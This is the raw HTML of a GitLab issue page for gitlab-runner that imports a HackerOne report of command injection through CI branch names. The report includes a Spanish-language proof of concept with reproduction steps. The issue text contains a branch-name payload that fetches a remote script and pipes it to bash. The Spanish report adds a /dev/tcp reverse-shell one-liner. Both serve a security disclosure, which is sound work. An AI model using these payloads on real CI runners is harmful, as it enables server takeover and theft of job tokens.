experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:250833,&quot;name&quot;:&quot;gitlab-runner&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab-runner/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab-runner/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"gitlab-runner","item":"https://gitlab.com/gitlab-org/gitlab-runner"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab-runner/-/issues"},{"@type":"ListItem","position":4,"name":"#27386","item":"https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27386"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;gitlab-runner&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab-runner&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/250833/runner.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab-runner/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#27386&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/new?add_related_issue=27386&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab-runner&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27386&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab-runner/-/issues/27386.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#27386&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab-runner/-/preview_markdown?target_id=27386\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:8,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab-runner/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;Command injection via branch name in CI pipelines.&quot;,&quot;initialTitleText&quot;:&quot;Command injection via branch name in CI pipelines.&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003ch2 data-sourcepos=\&quot;1:1-1:38\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-status-report-revised-2022-08-xx\&quot; class=\&quot;anchor\&quot; href=\&quot;#status-report-revised-2022-08-xx\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eStatus Report (revised: 2022-08-xx)\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:13\&quot; dir=\&quot;auto\&quot;\u003e{placeholder}\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:124\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;5:1-5:70\&quot;\u003e\u003ca data-sourcepos=\&quot;5:3-5:68\&quot; href=\&quot;https://hackerone.com/reports/1063511\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #1063511\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;5:76-5:85\&quot;\u003estanlyoncm\u003c/code\u003e on 2020-12-21, assigned to \u003ca href=\&quot;/dcouture\&quot; data-reference-type=\&quot;user\&quot; data-user=\&quot;4992072\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; class=\&quot;gfm gfm-project_member js-user-link\&quot; title=\&quot;Dominic Couture\&quot;\u003e@dcouture\u003c/a\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;7:1-7:87\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;7:1-7:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;7:21-7:47\&quot; href=\&quot;#attachments\&quot;\u003eAttachments\u003c/a\u003e | \u003ca data-sourcepos=\&quot;7:51-7:87\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;9:1-9:543\&quot; dir=\&quot;auto\&quot;\u003eBranch names are interpreted by the shell so you can inject commands. Someone could create a branch named \u003ccode data-sourcepos=\&quot;9:108-9:133\&quot;\u003e$(curl${IFS}abcd.com|bash)\u003c/code\u003e and host a script on that custom domain that would abuse the \u003ccode data-sourcepos=\&quot;9:198-9:209\&quot;\u003eCI_JOB_TOKEN\u003c/code\u003e. You&#39;d need then to get someone to contribute to your MR which borders on social engineering but you could do it by getting someone to Apply Suggestion and hope they don&#39;t pay attention to the odd branch name. This is also, and perhaps more importantly, related to the efforts in \u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/295234\&quot; data-reference-type=\&quot;issue\&quot; data-original=\&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/295234\&quot; data-link=\&quot;false\&quot; data-link-reference=\&quot;true\&quot; data-project=\&quot;278964\&quot; data-issue=\&quot;76351781\&quot; data-project-path=\&quot;gitlab-org/gitlab\&quot; data-iid=\&quot;295234\&quot; data-issue-type=\&quot;issue\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Make it possible to prevent non-maintainer users from defining CI variables\&quot; class=\&quot;gfm gfm-issue\&quot;\u003egitlab#295234 (closed)\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdetails\u003e\u0026#x000A;\u003csummary\u003e\u0026#x000A;Original report in spanish\u0026#x000A;\u003c/summary\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;16:1-16:9\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;18:1-18:22\&quot;\u003e==Report in Spanish:==\u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;20:1-20:14\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;22:1-22:251\&quot;\u003eDebido a que el nombre de una rama permite algunos \u003cstrong data-sourcepos=\&quot;22:52-22:76\&quot;\u003ecaracteres especiales\u003c/strong\u003e, un atacante \u003cem data-sourcepos=\&quot;22:91-22:107\&quot;\u003e(desarrollador)\u003c/em\u003e es capaz de ejecutar \u003cstrong data-sourcepos=\&quot;22:130-22:159\&quot;\u003ecódigo a nivel de sistema\u003c/strong\u003e en un servidor que este ejecutando \u003cstrong data-sourcepos=\&quot;22:196-22:211\&quot;\u003egilab-runner\u003c/strong\u003e para las canalizaciones de un proyecto.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;24:1-24:231\&quot;\u003eEl atacante que empuja una rama con nombre \u003cstrong data-sourcepos=\&quot;24:44-24:73\&quot;\u003e\u003ccode data-math-style=\&quot;inline\&quot; class=\&quot;code math js-render-math\&quot;\u003eCI_DEFAULT_BRANCH`\u003c/code\u003e{c}`\u003c/strong\u003e , es capaz luego de ejecutar una canalización a través de la interfaz de gitlab.com, estableciendo como valor de \u003cstrong data-sourcepos=\&quot;24:190-24:200\&quot;\u003e“c”\u003c/strong\u003e un comando a nivel de sistema.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;26:1-26:288\&quot;\u003eLo que hace interesante a este ataque es que, no es necesaria la creación o modificación de ningún archivo del proyecto mientras se envía el trabajo a la canalización, por ejemplo \u003ccode data-sourcepos=\&quot;26:187-26:200\&quot;\u003e.gitlab-ci.yml\u003c/code\u003e, lo que indiciaria una posible acción maliciosa por parte de quien envía el trabajo.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;28:1-28:291\&quot;\u003eEl trabajo no dejara rastros de haber ejecutado algún comando en el servidor, ya que, el atacante debe redirigir la salida del comando hacia \u003ccode data-sourcepos=\&quot;28:144-28:152\&quot;\u003e/dev/null\u003c/code\u003e,  además, el comando es ejecutado como producto de haber sido concatenado con el nombre de la rama a través de una variable de entorno.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;30:1-30:415\&quot;\u003ePara la prueba de concepto, realice las pruebas bajo un entorno controlado ejecutando un corredor con un ejecutor \u003cstrong data-sourcepos=\&quot;30:115-30:135\&quot;\u003e“”shell””\u003c/strong\u003e y enviando un único trabajo que imprime un mensaje al finalizar. Luego al ejecutar una canalización desde la interfaz web y asignar un comando a nivel de sistema al valor de la variable de entorno \u003cstrong data-sourcepos=\&quot;30:336-30:346\&quot;\u003e“c”\u003c/strong\u003e, pude obtener una conexión inversa mediante el siguiente comando.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;31:1-33:5\&quot; data-canonical-lang=\&quot;bash\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eexec \u003c/span\u003e5\u0026amp;lt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;gt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e/dev/tcp/172.17.0.2/4444 \u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003ewhile \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eread \u003c/span\u003eline 0\u0026amp;lt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e5\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003edo\u003c/span\u003e \u003cspan class=\&quot;nv\&quot;\u003e$line\u003c/span\u003e 2\u0026amp;gt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e5 \u0026amp;gt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e5\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e \u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e \u0026amp;amp\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u0026amp;gt\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e/dev/null  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;34:1-36:4\&quot;\u003eCabe destacar que yo he inyectado el comando anterior para demostrar el impacto que tendría esta vulnerabilidad en el servidor victima al ser tomando por un atacante, logrando incluso la persistencia en el sistema aun cuando el trabajo es eliminado o borrado, además he realizado un prueba de concepto en video que adjuntare con el reporte, sin embargo en los pasos para reproducir este problema, usted ejecutara el comando \u003ccode data-sourcepos=\&quot;34:428-34:436\&quot;\u003ehostname \u003c/code\u003een el sistema.\u003cbr data-sourcepos=\&quot;34:454-34:454\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;37:1-37:25\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-steps-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#steps-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSteps to reproduce\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;39:1-39:18\&quot;\u003e\u003cstrong data-sourcepos=\&quot;39:1-39:18\&quot;\u003e[Preparación]\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;41:1-41:27\&quot;\u003e\u003cstrong data-sourcepos=\&quot;41:1-41:6\&quot;\u003e1)\u003c/strong\u003e Ingrese a Gitlab.com\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;43:1-43:30\&quot;\u003e\u003cstrong data-sourcepos=\&quot;43:1-43:6\&quot;\u003e2)\u003c/strong\u003e Cree un proyecto nuevo.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;45:1-45:60\&quot;\u003e\u003cstrong data-sourcepos=\&quot;45:1-45:6\&quot;\u003e3)\u003c/strong\u003e Ejecute gitlab-runner en un servidor bajo su control.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;47:1-47:99\&quot;\u003e\u003cstrong data-sourcepos=\&quot;47:1-47:6\&quot;\u003e4)\u003c/strong\u003e Registre un corredor para su proyecto \u003cem data-sourcepos=\&quot;47:46-47:98\&quot;\u003e(para este informe yo he elegido el ejecutor shell)\u003c/em\u003e.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;49:1-49:88\&quot;\u003e\u003cstrong data-sourcepos=\&quot;49:1-49:6\&quot;\u003e5)\u003c/strong\u003e Cree un archivo valido \u003ccode data-sourcepos=\&quot;49:32-49:45\&quot;\u003e.gitlab-ci.yml\u003c/code\u003e, y registre el corredor para el proyecto.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;51:1-54:73\&quot;\u003e\u003cstrong data-sourcepos=\&quot;51:1-51:6\&quot;\u003e6)\u003c/strong\u003e Invite un nuevo miembro con permisos de desarrollador.\u003cbr data-sourcepos=\&quot;51:64-51:64\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003cbr data-sourcepos=\&quot;53:5-53:5\&quot;\u003e\u0026#x000A;\u003cstrong data-sourcepos=\&quot;54:1-54:22\&quot;\u003e[Flujo del ataque]\u003c/strong\u003e \u003cem data-sourcepos=\&quot;54:24-54:73\&quot;\u003e(miembro invitado con permisos de desarrollador)\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;56:1-56:76\&quot;\u003e\u003cstrong data-sourcepos=\&quot;56:1-56:6\&quot;\u003e1)\u003c/strong\u003e Cree una rama con el siguiente nombre  \u003cstrong data-sourcepos=\&quot;56:47-56:76\&quot;\u003e\u003ccode data-math-style=\&quot;inline\&quot; class=\&quot;code math js-render-math\&quot;\u003eCI_DEFAULT_BRANCH`\u003c/code\u003e{c}`\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;58:1-58:173\&quot;\u003e\u003cstrong data-sourcepos=\&quot;58:1-58:6\&quot;\u003e2)\u003c/strong\u003e Ingrese a \u003ccode data-sourcepos=\&quot;58:19-58:81\&quot;\u003ehttps://gitlab.com/\u0026amp;lt;user\u0026amp;gt;/\u0026amp;lt;project\u0026amp;gt;/-/pipelines/new\u003c/code\u003e y seleccione la rama \u003cstrong data-sourcepos=\&quot;58:105-58:134\&quot;\u003e\u003ccode data-math-style=\&quot;inline\&quot; class=\&quot;code math js-render-math\&quot;\u003eCI_DEFAULT_BRANCH`\u003c/code\u003e{c}`\u003c/strong\u003e para ejecutar una nueva canalización.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;60:1-60:67\&quot;\u003e\u003cstrong data-sourcepos=\&quot;60:1-60:6\&quot;\u003e3)\u003c/strong\u003e Cree la variable de nombre \u003ccode data-sourcepos=\&quot;60:36-60:36\&quot;\u003ec\u003c/code\u003e con el valor \u003ccode data-sourcepos=\&quot;60:53-60:65\&quot;\u003eeval hostname\u003c/code\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;62:1-62:32\&quot;\u003e\u003cstrong data-sourcepos=\&quot;62:1-62:6\&quot;\u003e4)\u003c/strong\u003e Ejecute la canalización.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;64:1-64:139\&quot;\u003eComo resultado de esto el trabajo fallara ya que no redirigió la salida del comando al \u003ccode data-sourcepos=\&quot;64:90-64:98\&quot;\u003e/dev/null\u003c/code\u003e o no envió el comando a segundo plano.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;66:1-66:55\&quot;\u003eObtendrá el siguiente mensaje al finalizar el trabajo:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;68:1-68:71\&quot;\u003e\u003ccode data-sourcepos=\&quot;68:2-68:70\&quot;\u003efatal: couldn\u0026amp;#39;t find remote ref refs/heads/master\u0026amp;lt;hostname\u0026amp;gt;\u003c/code\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;70:1-72:4\&quot;\u003eObtendrá el resultando del comando junto a la referencia remota \u003ccode data-sourcepos=\&quot;70:67-70:72\&quot;\u003emaster\u003c/code\u003e, lo que indica que ha ejecutado un comando el el servidor de la victima.\u003cbr data-sourcepos=\&quot;70:149-70:149\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;73:1-73:44\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-current-bug-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-current-bug-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the current \u003cem data-sourcepos=\&quot;73:28-73:32\&quot;\u003ebug\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;74:1-77:4\&quot;\u003e \u0026#x000A;El nombre de la rama permite concatenar un comando a nivel de sistema que será ejecutado al momento de enviar una canalización.\u003cbr data-sourcepos=\&quot;75:132-75:132\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;78:1-78:47\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-expected-correct-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-expected-correct-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the expected \u003cem data-sourcepos=\&quot;78:29-78:37\&quot;\u003ecorrect\u003c/em\u003e behavior?\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;80:1-82:4\&quot;\u003eSe debe evaluar el nombre de la rama como una cadena de caracteres al momento de ejecutar una canalización.\u003cbr data-sourcepos=\&quot;80:111-80:111\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;83:1-83:39\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-relevant-logs-andor-screenshots\&quot; class=\&quot;anchor\&quot; href=\&quot;#relevant-logs-andor-screenshots\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eRelevant logs and/or screenshots\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;85:1-85:78\&quot;\u003eEn este video de prueba de concepto, se omiten los pasos de \u003cstrong data-sourcepos=\&quot;85:61-85:78\&quot;\u003e[Preparación]\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;87:1-89:4\&quot;\u003e\u003cspan class=\&quot;media-container video-container\&quot;\u003e\u003cvideo src=\&quot;https://user-content.gitlab-static.net/d1e8140575ab3115ec65684c70f03d057efc5cd9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63633939373635612d633839352d343365642d623338352d6132633533343437306536382f706f632e6d7034\&quot; controls=\&quot;true\&quot; data-setup=\&quot;{}\&quot; data-title=\&quot;poc.mp4\&quot; preload=\&quot;metadata\&quot; width=\&quot;400\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4\&quot;\u003e\u003c/video\u003e\u003ca href=\&quot;https://user-content.gitlab-static.net/d1e8140575ab3115ec65684c70f03d057efc5cd9/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63633939373635612d633839352d343365642d623338352d6132633533343437306536382f706f632e6d7034\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; title=\&quot;Download &#39;poc.mp4&#39;\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4\&quot;\u003epoc.mp4\u003c/a\u003e\u003c/span\u003e\u003cbr data-sourcepos=\&quot;87:87-87:87\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch5 data-sourcepos=\&quot;90:1-90:23\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-output-of-checks\&quot; class=\&quot;anchor\&quot; href=\&quot;#output-of-checks\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eOutput of checks\u003c/h5\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;92:1-94:2\&quot;\u003eThis bug happens on GitLab.com\u003cbr data-sourcepos=\&quot;92:33-92:33\&quot;\u003e\u0026#x000A; \u0026#x000A; \u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;96:1-96:12\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;98:1-98:557\&quot;\u003eSe puede ejecutar código arbitrario a nivel de sistema en ejecuciones CI, con tan solo enviar una nueva rama al proyecto y ejecutar una canalización, esto, sin modificar o crear ningún archivo que indique la acción mal intencionada por parte del atacante, debido a esto este ataque puede ser aun mas peligroso si se ejecutan las compilaciones en servidores de confianza ya que, como dije anteriormente no es necesaria la modificación de ningún archivo y además, no se crean registros de logs sobre la salida de algún comando enviado por el atacante.\u003c/p\u003e\u0026#x000A;\u003c/details\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;102:1-102:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-attachments\&quot; class=\&quot;anchor\&quot; href=\&quot;#attachments\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAttachments\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;104:1-104:77\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;104:1-104:12\&quot;\u003eWarning:\u003c/strong\u003e Attachments received through HackerOne, please exercise caution!\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;106:1-107:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;106:1-107:0\&quot;\u003e\u003ca data-sourcepos=\&quot;106:3-106:85\&quot; href=\&quot;https://h1.sec.gitlab.net/a/cc99765a-c895-43ed-b385-a2c534470e68/poc.mp4\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003epoc.mp4\u003c/a\u003e\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;108:1-108:19\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-how-to-reproduce\&quot; class=\&quot;anchor\&quot; href=\&quot;#how-to-reproduce\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eHow To Reproduce\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;110:1-110:57\&quot; dir=\&quot;auto\&quot;\u003ePlease add \u003ca data-sourcepos=\&quot;110:12-110:40\&quot; href=\&quot;https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ereproducibility information\u003c/a\u003e to this section:\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;112:1-122:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;112:1-112:30\&quot;\u003e\u0026#x000A;\u003cp 